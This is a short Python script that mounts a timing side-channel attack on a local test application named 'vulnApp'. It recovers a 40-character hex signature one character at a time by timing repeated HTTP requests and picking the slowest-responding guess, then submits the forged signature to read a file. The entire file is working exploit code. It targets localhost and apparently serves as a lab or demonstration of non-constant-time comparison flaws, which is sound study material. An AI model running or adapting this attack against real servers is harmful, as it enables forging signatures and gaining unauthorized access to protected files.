import urllib.request
from urllib.error import HTTPError
from datetime import datetime

letterSet=['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']
file="foo"
guessedHash=bytearray('='*40, "UTF-8")

print("File:", file)
print("Hash:", end='', flush=True)

for i in range(40):
	newLetter=letterSet[0]
	scores={}
	for c in letterSet:
		scores[c]=0
	for j in range(20):
		maxTime=0
		for d in letterSet:
			guessedHash[i]=ord(d)
			timeBefore = datetime.now().microsecond
			try:
				urllib.request.urlopen("http://127.0.0.1:8000/vulnApp/?file=" + file + "&signature=" + guessedHash.decode("UTF-8"))
			except HTTPError as e:
				pass
			timeAfter = datetime.now().microsecond
			timeElapsed=timeAfter-timeBefore
			if timeElapsed>maxTime:
				maxTime=timeElapsed
				newLetter=d
		scores[newLetter]+=1
	maxScore=0
	for c, d in scores.items():
		if d>maxScore:
			maxScore=d
			newLetter=c
	guessedHash[i]=ord(newLetter)
	print(newLetter, end='', flush=True)
print("")
try:
	urllib.request.urlopen("http://127.0.0.1:8000/vulnApp/?file=" + file + "&signature=" + guessedHash.decode("UTF-8"))
	print("Correct hash!")
except HTTPError as e:
	print("Inorrect hash!")